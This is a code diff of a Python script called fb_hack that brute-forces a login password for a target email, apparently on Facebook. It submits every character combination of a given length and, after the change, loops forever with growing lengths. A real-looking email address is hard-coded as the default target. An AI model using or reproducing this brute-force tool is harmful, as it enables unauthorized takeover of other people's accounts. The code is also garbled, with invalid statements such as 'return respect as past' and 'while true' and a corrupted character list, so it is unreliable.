@@ -56,7 +56,6 @@ def fb_hack(email, codex, respect):
   browser.form['email'] = email
   browser.submit()
   counter = 0
-  while zz <= 8 and zz >= 6:
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z","!","#","$","%","^","&","*"], repeat=int(respect)):
     p = (''.join(map(str, combination)))
     counter += 1
@@ -157,9 +156,13 @@ def fb_hack(email, codex, respect):
     browser.close()
     reset = int(-1)
   return reset"""
+  return respect as past
 
 os.system('clear')
 ehack = input('Email address or username to attack:') or str("amschwab@comcast.net")
 reset = int(input('Code: ') or 1)
 past = int(input('Length: ') or 6)
-fb_hack(ehack, reset, past)
+while true:
+  fb_hack(ehack, reset, past)
+  past += 1
+
